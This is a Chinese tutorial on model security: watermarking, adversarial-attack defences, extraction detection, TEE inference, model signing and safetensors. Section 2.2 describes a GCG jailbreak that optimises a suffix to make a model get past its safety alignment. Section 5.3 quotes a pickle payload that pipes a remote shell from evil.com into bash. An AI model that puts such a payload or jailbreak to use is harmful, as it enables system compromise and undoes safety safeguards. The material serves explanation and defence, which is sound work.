# 模型安全

## 1. 模型水印（Model Watermarking）

### 1.1 为什么需要模型水印

```
问题场景：
- 你的公司花费数百万训练了一个大模型
- 竞争对手通过 API 蒸馏了你的模型
- 如何证明对方的模型源自你的？

模型水印的作用：
┌──────────────────────────────────────────────┐
│  版权保护    —— 证明模型所有权               │
│  泄露追踪    —— 追溯模型泄露路径             │
│  合规审计    —— 证明输出来自授权模型         │
│  AI 生成检测 —— 判断文本是否为 AI 生成       │
└──────────────────────────────────────────────┘
```

### 1.2 训练时嵌入水印

```python
"""
训练时水印嵌入策略：
在模型训练阶段将特定模式嵌入模型参数中

核心思路：
- 设计一组"触发输入"（trigger set）
- 训练时强制模型对这些输入产生特定输出
- 正常使用不受影响，但验证时可检测水印
"""

import torch
import torch.nn as nn
from torch.utils.data import DataLoader, ConcatDataset

class WatermarkEmbedder:
    """训练时水印嵌入器"""
    
    def __init__(self, model: nn.Module, watermark_key: str):
        self.model = model
        self.watermark_key = watermark_key
        self.trigger_set = self._generate_trigger_set(watermark_key)
    
    def _generate_trigger_set(self, key: str) -> list:
        """
        根据密钥生成触发集
        触发集 = [(特殊输入, 预期输出), ...]
        """
        import hashlib
        seed = int(hashlib.sha256(key.encode()).hexdigest()[:8], 16)
        torch.manual_seed(seed)
        
        triggers = []
        for i in range(100):  # 100 个触发样本
            trigger_input = torch.randn(1, 512)  # 随机但确定性的输入
            expected_output = torch.tensor([i % 10])  # 特定输出
            triggers.append((trigger_input, expected_output))
        return triggers
    
    def train_with_watermark(self, train_loader: DataLoader, 
                             epochs: int = 10, wm_weight: float = 0.1):
        """在正常训练中嵌入水印"""
        optimizer = torch.optim.Adam(self.model.parameters(), lr=1e-4)
        criterion = nn.CrossEntropyLoss()
        
        for epoch in range(epochs):
            for batch_x, batch_y in train_loader:
                # 正常训练损失
                pred = self.model(batch_x)
                task_loss = criterion(pred, batch_y)
                
                # 水印损失：强制触发集产生特定输出
                wm_loss = self._compute_watermark_loss(criterion)
                
                # 联合优化
                total_loss = task_loss + wm_weight * wm_loss
                optimizer.zero_grad()
                total_loss.backward()
                optimizer.step()
    
    def _compute_watermark_loss(self, criterion) -> torch.Tensor:
        """计算水印损失"""
        loss = torch.tensor(0.0)
        for trigger_input, expected_output in self.trigger_set[:10]:
            pred = self.model(trigger_input)
            loss += criterion(pred, expected_output)
        return loss / 10
```

### 1.3 推理时水印检测（文本水印）

```python
"""
KGW 水印方案（Kirchenbauer et al., 2023）：
在文本生成时，通过修改 token 采样概率嵌入水印

核心思想：
1. 对每个位置，用前一个 token 作为种子生成"绿色列表"
2. 生成时偏向绿色列表中的 token
3. 检测时统计绿色 token 比例是否显著高于随机
"""

import hashlib
import numpy as np
from typing import List

class TextWatermark:
    """文本生成水印（KGW 方案简化实现）"""
    
    def __init__(self, vocab_size: int, secret_key: str, gamma: float = 0.5):
        self.vocab_size = vocab_size
        self.secret_key = secret_key
        self.gamma = gamma  # 绿色列表占比
    
    def get_green_list(self, previous_token_id: int) -> set:
        """根据前一个 token 确定绿色列表"""
        seed = hashlib.sha256(
            f"{self.secret_key}:{previous_token_id}".encode()
        ).hexdigest()
        rng = np.random.RandomState(int(seed[:8], 16))
        
        # 随机选择 gamma 比例的 token 作为绿色列表
        green_size = int(self.vocab_size * self.gamma)
        green_list = set(rng.choice(self.vocab_size, green_size, replace=False))
        return green_list
    
    def apply_watermark(self, logits: np.ndarray, 
                        previous_token_id: int, delta: float = 2.0) -> np.ndarray:
        """在生成时修改 logits，偏向绿色 token"""
        green_list = self.get_green_list(previous_token_id)
        watermarked_logits = logits.copy()
        
        for token_id in green_list:
            watermarked_logits[token_id] += delta  # 增加绿色 token 的 logit
        
        return watermarked_logits
    
    def detect_watermark(self, token_ids: List[int], threshold: float = 4.0) -> dict:
        """检测文本是否包含水印"""
        if len(token_ids) < 2:
            return {"watermarked": False, "z_score": 0.0}
        
        green_count = 0
        total = len(token_ids) - 1
        
        for i in range(1, len(token_ids)):
            green_list = self.get_green_list(token_ids[i - 1])
            if token_ids[i] in green_list:
                green_count += 1
        
        # z-test: 检验绿色 token 比例是否显著高于 gamma
        expected = total * self.gamma
        std = np.sqrt(total * self.gamma * (1 - self.gamma))
        z_score = (green_count - expected) / std if std > 0 else 0
        
        return {
            "watermarked": z_score > threshold,
            "z_score": round(z_score, 3),
            "green_ratio": round(green_count / total, 3),
            "expected_ratio": self.gamma,
            "confidence": "high" if z_score > 6 else "medium" if z_score > 4 else "low"
        }
```

## 2. 对抗攻击（Adversarial Attacks）

### 2.1 对抗攻击分类

```
┌──────────────────────────────────────────────────┐
│             对抗攻击分类                           │
├─────────────────┬────────────────────────────────┤
│  按知识分类      │                                │
│  - 白盒攻击     │ 已知模型结构和参数              │
│  - 黑盒攻击     │ 只能通过 API 查询              │
│  - 灰盒攻击     │ 已知部分信息（如架构）          │
├─────────────────┼────────────────────────────────┤
│  按目标分类      │                                │
│  - 无目标攻击   │ 让模型输出错误即可              │
│  - 有目标攻击   │ 让模型输出特定错误结果          │
├─────────────────┼────────────────────────────────┤
│  按扰动类型      │                                │
│  - 文本对抗     │ 同义替换、拼写变体、Unicode     │
│  - 图像对抗     │ 像素微调、patch 攻击           │
│  - 音频对抗     │ 不可听噪声                     │
└─────────────────┴────────────────────────────────┘
```

### 2.2 针对 LLM 的对抗攻击

```python
"""
GCG (Greedy Coordinate Gradient) 攻击：
自动搜索对抗后缀，使模型绕过安全对齐

原理：
1. 在用户输入后附加一段对抗后缀
2. 通过梯度信息迭代优化后缀
3. 优化目标：让模型生成肯定性开头（如 "Sure, here is..."）
"""

class GCGAttack:
    """GCG 对抗攻击（概念演示）"""
    
    def __init__(self, model, tokenizer, suffix_length: int = 20):
        self.model = model
        self.tokenizer = tokenizer
        self.suffix_length = suffix_length
    
    def attack(self, harmful_prompt: str, target_prefix: str = "Sure, here is",
               iterations: int = 500, batch_size: int = 512) -> str:
        """
        搜索对抗后缀
        注意：此为研究代码，用于理解攻击原理和测试防御
        """
        # 初始化随机后缀
        suffix_ids = torch.randint(0, self.tokenizer.vocab_size, 
                                   (self.suffix_length,))
        
        for step in range(iterations):
            # 1. 构建完整输入
            full_prompt = harmful_prompt + self.tokenizer.decode(suffix_ids)
            
            # 2. 计算梯度：哪些 token 替换能最大化目标概率
            gradients = self._compute_token_gradients(full_prompt, target_prefix)
            
            # 3. 贪心搜索：尝试替换每个位置的 token
            candidates = self._generate_candidates(suffix_ids, gradients, batch_size)
            
            # 4. 选择最优候选
            best_suffix = self._evaluate_candidates(
                harmful_prompt, candidates, target_prefix
            )
            suffix_ids = best_suffix
        
        return self.tokenizer.decode(suffix_ids)
    
    def _compute_token_gradients(self, prompt, target):
        """计算 token 级梯度（白盒攻击需要模型权重）"""
        # 实际实现需要模型的嵌入层梯度
        pass
    
    def _generate_candidates(self, current_suffix, gradients, batch_size):
        """基于梯度生成候选后缀"""
        pass
    
    def _evaluate_candidates(self, prompt, candidates, target):
        """评估候选后缀的攻击效果"""
        pass
```

### 2.3 对抗攻击防御

```python
class AdversarialDefense:
    """对抗攻击防御策略"""
    
    def perplexity_filter(self, text: str, model, tokenizer, 
                          threshold: float = 100.0) -> bool:
        """
        困惑度过滤：对抗后缀通常具有高困惑度
        正常文本困惑度通常 < 50，对抗文本常 > 200
        """
        inputs = tokenizer(text, return_tensors="pt")
        with torch.no_grad():
            outputs = model(**inputs, labels=inputs["input_ids"])
        perplexity = torch.exp(outputs.loss).item()
        return perplexity < threshold  # True = 正常, False = 可疑
    
    def input_smoothing(self, text: str, num_copies: int = 5) -> list:
        """
        输入平滑：对输入做多次随机扰动，检查输出一致性
        对抗样本在轻微扰动后通常会失效
        """
        import random
        smoothed_inputs = []
        for _ in range(num_copies):
            chars = list(text)
            # 随机删除/替换少量字符
            for i in range(len(chars)):
                if random.random() < 0.05:  # 5% 概率扰动
                    chars[i] = random.choice([' ', '', chars[i]])
            smoothed_inputs.append(''.join(chars))
        return smoothed_inputs
    
    def retokenization_defense(self, text: str, tokenizer) -> str:
        """
        重新分词防御：
        BPE 分词的对抗攻击依赖特定分词结果
        通过添加空格/重新分词可以破坏对抗后缀
        """
        # 先分词再重新组合
        tokens = tokenizer.tokenize(text)
        # 随机在 token 边界插入/删除空格
        reconstructed = tokenizer.convert_tokens_to_string(tokens)
        return reconstructed
```

## 3. 模型逆向与窃取防护

### 3.1 威胁模型

```
模型窃取攻击方式：
┌───────────────────────────────────────────────┐
│  1. API 蒸馏攻击                               │
│     大量查询目标模型 → 收集 (input, output)     │
│     → 训练影子模型复制目标模型的行为            │
│                                               │
│  2. 侧信道攻击                                 │
│     通过推理时间/功耗推断模型结构               │
│                                               │
│  3. 物理访问                                   │
│     直接获取模型权重文件                        │
│                                               │
│  4. 内部威胁                                   │
│     有权限的员工泄露模型                        │
└───────────────────────────────────────────────┘
```

### 3.2 防护措施

```python
class ModelProtection:
    """模型防窃取保护"""
    
    def __init__(self):
        self.query_log = []
    
    def detect_extraction_attempt(self, user_id: str, 
                                   query_history: list) -> bool:
        """
        检测 API 蒸馏行为：
        - 异常高的查询频率
        - 系统性的输入模式（网格搜索、边界探测）
        - 大量多样性极高的查询（覆盖输入空间）
        """
        # 检查查询频率
        recent_queries = [q for q in query_history 
                         if q["timestamp"] > time.time() - 3600]
        if len(recent_queries) > 1000:
            return True
        
        # 检查查询多样性（蒸馏攻击通常覆盖广泛）
        if self._high_diversity_score(recent_queries) > 0.9:
            return True
        
        # 检查是否有系统性探测模式
        if self._detect_systematic_probing(recent_queries):
            return True
        
        return False
    
    def add_output_perturbation(self, logits: np.ndarray, 
                                epsilon: float = 0.01) -> np.ndarray:
        """
        输出扰动：在 API 返回的概率分布中添加噪声
        降低蒸馏攻击的效果，同时不影响用户体验
        """
        noise = np.random.laplace(0, epsilon, logits.shape)
        return logits + noise
    
    def watermark_api_output(self, output_text: str, user_id: str) -> str:
        """
        在 API 输出中嵌入用户特定水印
        如果模型被蒸馏，可以追踪到是哪个用户泄露的
        """
        # 通过微调用词选择嵌入用户标识
        # 例如：在同义词中选择特定变体
        pass
    
    def _high_diversity_score(self, queries: list) -> float:
        """计算查询集合的多样性得分"""
        return 0.5  # 实际需要计算嵌入空间的覆盖度
    
    def _detect_systematic_probing(self, queries: list) -> bool:
        """检测系统性探测模式"""
        return False  # 实际需要检测输入空间的规律性
```

## 4. 机密计算（Confidential Computing）

### 4.1 概述

```
机密计算核心思想：即使云服务商也无法看到你的数据和模型

┌──────────────────────────────────────────────────┐
│  传统部署：                                       │
│  用户数据 → [云服务商可见] → GPU → [云服务商可见]  │
│                                                  │
│  机密计算：                                       │
│  用户数据 → [加密飞地/TEE] → GPU → [加密输出]     │
│              ↑ 即使管理员也无法窥视                │
└──────────────────────────────────────────────────┘

关键技术：
┌──────────┬──────────────────────────────────────┐
│  Intel SGX│ CPU 级安全飞地（Enclave）             │
│  Intel TDX│ VM 级可信域（Trust Domain）           │
│  AMD SEV  │ 安全加密虚拟化                       │
│  NVIDIA CC│ GPU 机密计算（H100/H200 支持）       │
│  ARM CCA  │ 机密计算架构                         │
└──────────┴──────────────────────────────────────┘

注意：H20 目前不原生支持 NVIDIA CC，
但可通过 CPU TEE + 安全数据通路实现部分保护
```

### 4.2 TEE 在 AI 推理中的应用

```python
"""
安全推理流程（概念设计）：

1. 模型加密存储在磁盘上
2. 在 TEE 内解密模型权重
3. 在安全内存区域执行推理
4. 输出加密后返回用户
5. 推理完成后清除安全内存

H20 部署的实际方案：
由于 H20 不支持 GPU 级 CC，采用以下折衷：
- 使用 Intel TDX VM 保护 CPU 侧数据处理
- 模型权重加密存储，在 GPU 内存中解密
- 限制 SSH/物理访问
- 启用 GPU 内存加密（MIG 隔离）
"""

class SecureInferenceManager:
    """安全推理管理器（架构设计）"""
    
    def __init__(self, model_path: str, encryption_key: bytes):
        self.model_path = model_path
        self.encryption_key = encryption_key
        self.model = None
    
    def load_model_secure(self):
        """在安全环境中加载加密模型"""
        # 1. 验证环境完整性（远程证明）
        if not self._verify_attestation():
            raise SecurityError("环境认证失败")
        
        # 2. 解密模型权重
        encrypted_weights = self._read_encrypted_model()
        decrypted_weights = self._decrypt_in_tee(encrypted_weights)
        
        # 3. 加载到 GPU（通过安全通道）
        self.model = self._load_to_gpu(decrypted_weights)
        
        # 4. 清除 CPU 内存中的明文权重
        del decrypted_weights
        import gc; gc.collect()
    
    def secure_inference(self, input_data: bytes) -> bytes:
        """执行安全推理"""
        # 解密输入
        plaintext_input = self._decrypt_input(input_data)
        
        # 推理
        output = self.model(plaintext_input)
        
        # 加密输出
        encrypted_output = self._encrypt_output(output)
        
        return encrypted_output
    
    def _verify_attestation(self) -> bool:
        """远程证明：验证当前环境可信"""
        # 实际实现需要与证明服务通信
        return True
    
    def _decrypt_in_tee(self, data: bytes) -> bytes:
        """在 TEE 内解密"""
        from cryptography.fernet import Fernet
        f = Fernet(self.encryption_key)
        return f.decrypt(data)
```

## 5. 安全模型分发

### 5.1 模型分发安全要求

```
安全分发流程：
┌──────────┐    ┌──────────┐    ┌──────────┐
│ 模型仓库  │───→│ 传输通道  │───→│ 部署环境  │
│          │    │          │    │          │
│ - 签名    │    │ - TLS    │    │ - 验签   │
│ - 加密    │    │ - 完整性  │    │ - 解密   │
│ - 版本    │    │ - 认证   │    │ - 审计   │
└──────────┘    └──────────┘    └──────────┘
```

### 5.2 模型签名与验证

```python
import hashlib
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec, utils

class ModelSigner:
    """模型文件签名和验证"""
    
    def __init__(self):
        self.private_key = ec.generate_private_key(ec.SECP384R1())
        self.public_key = self.private_key.public_key()
    
    def sign_model(self, model_path: str) -> dict:
        """对模型文件生成签名"""
        # 计算模型文件哈希
        file_hash = self._compute_file_hash(model_path)
        
        # 使用私钥签名
        signature = self.private_key.sign(
            file_hash,
            ec.ECDSA(hashes.SHA384())
        )
        
        return {
            "model_path": model_path,
            "hash_algorithm": "sha384",
            "file_hash": file_hash.hex(),
            "signature": signature.hex(),
            "public_key": self.public_key.public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo
            ).decode()
        }
    
    def verify_model(self, model_path: str, signature_info: dict) -> bool:
        """验证模型文件完整性和来源"""
        # 重新计算哈希
        file_hash = self._compute_file_hash(model_path)
        
        # 比对哈希
        if file_hash.hex() != signature_info["file_hash"]:
            return False
        
        # 验证签名
        try:
            public_key = serialization.load_pem_public_key(
                signature_info["public_key"].encode()
            )
            public_key.verify(
                bytes.fromhex(signature_info["signature"]),
                file_hash,
                ec.ECDSA(hashes.SHA384())
            )
            return True
        except Exception:
            return False
    
    def _compute_file_hash(self, path: str) -> bytes:
        """计算文件 SHA-384 哈希"""
        h = hashlib.sha384()
        with open(path, "rb") as f:
            while chunk := f.read(8192):
                h.update(chunk)
        return h.digest()
```

### 5.3 使用 safetensors 格式

```python
"""
为什么使用 safetensors 而非 pickle：

pickle 格式风险：
- 反序列化时可执行任意代码
- 攻击者可在模型文件中植入后门代码
- import os; os.system("curl evil.com/shell | bash")

safetensors 格式优势：
- 纯数据格式，不含可执行代码
- 内存映射加载，更快更安全
- 支持完整性校验
"""

from safetensors.torch import save_file, load_file

def secure_save_model(model, path: str, metadata: dict = None):
    """安全保存模型（safetensors 格式）"""
    tensors = {name: param.data for name, param in model.named_parameters()}
    save_file(tensors, path, metadata=metadata)

def secure_load_model(model, path: str) -> dict:
    """安全加载模型（safetensors 格式）"""
    tensors = load_file(path)
    # 验证 tensor 形状与模型匹配
    for name, param in model.named_parameters():
        if name in tensors:
            if param.shape != tensors[name].shape:
                raise ValueError(f"Shape mismatch for {name}")
            param.data = tensors[name]
    return tensors
```

## 6. 小结

模型安全需要多维度保护：

1. **水印技术**：证明模型所有权和检测 AI 生成内容
2. **对抗防御**：通过困惑度过滤、输入平滑等降低攻击成功率
3. **窃取防护**：检测异常查询模式、输出扰动、API 水印
4. **机密计算**：通过 TEE 保护推理过程中的模型和数据
5. **安全分发**：签名验证、加密传输、safetensors 格式

在 8x H20 环境中的实践重点：
- 使用 safetensors 格式加载所有模型
- 部署查询频率监控和异常检测
- 对 API 输出实施文本水印
- 通过网络隔离和访问控制保护模型文件
